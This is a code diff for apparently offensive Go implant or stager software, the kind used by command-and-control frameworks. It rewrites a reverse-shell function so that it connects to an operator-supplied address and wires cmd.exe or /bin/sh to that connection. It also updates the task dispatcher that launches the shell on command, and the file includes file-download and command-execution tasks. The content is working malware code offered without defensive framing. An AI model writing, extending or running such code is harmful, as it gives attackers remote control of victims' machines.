@@ -215,35 +215,27 @@ func execute_module(
 	return
 }
 
-func reverse_shell(address string, port string) {
-	conn, err := net.Dial("tcp", address+":"+port)
+func reverse_shell(address string, port float64) {
+	// convert the port to an string
+	converted_port := strconv.Itoa(int(port))
+	conn, err := net.Dial("tcp", address+":"+converted_port)
 
 	if err != nil {
 		return
 	}
-	for {
 
-		message, err := bufio.NewReader(conn).ReadString('\n')
-
-		if err != nil {
-			return
-		}
-
-		// split the message into command and arguments
-		parts := strings.Fields(message)
-		cmd := parts[0]
-		args := parts[1:]
-
-		// run the command
-		out, err := exec.Command(cmd, args...).Output()
-
-		if err != nil {
-			fmt.Fprintf(conn, "%s\n", err)
-		}
-
-		fmt.Fprintf(conn, "%s\n", out)
-
+	var cmd *exec.Cmd
+	
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe")
+	} else {
+		cmd = exec.Command("/bin/sh")
 	}
+
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Run()
 }
 
 func download_file(task_name string, path string) {
@@ -343,7 +335,7 @@ func {{stager.options["exported_function"]}}() {
 			case "dir":
 				run_command("ls " + task.Args["dir"].(string))
 			case "reverse-shell":
-				go reverse_shell(task.Args["address"].(string), task.Args["port"].(string))
+				go reverse_shell(task.Args["address"].(string), task.Args["port"].(float64))
 				output, success = "Opened reverse shell.", true
 			case "download":
 				upload_file(task.Args["target_path"].(string))
